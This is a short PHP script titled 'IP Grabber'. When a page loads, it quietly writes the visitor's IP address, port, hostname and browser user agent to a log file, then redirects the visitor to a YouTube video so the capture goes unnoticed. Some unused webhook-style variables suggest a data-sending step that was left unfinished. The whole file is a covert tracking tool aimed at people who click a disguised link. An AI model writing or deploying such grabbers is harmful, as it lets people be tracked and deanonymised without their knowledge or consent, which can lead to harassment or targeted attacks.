<?php
 
//IP Grabber

//Changeables Variables

$redirect = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; #URL of redirection
$filename = "visitors.log"; #Filename

//Fix Variables 
$date = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$line = $date . "\n" . $ip . "\n" . $port . "\n" . $hostname . "\n" . $agent . "\n---------------------------";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ["content"=> $line];

file_put_contents($filename, $line . PHP_EOL, FILE_APPEND);

echo '<script>window.location.replace("'. $redirect .'");</script>'
?>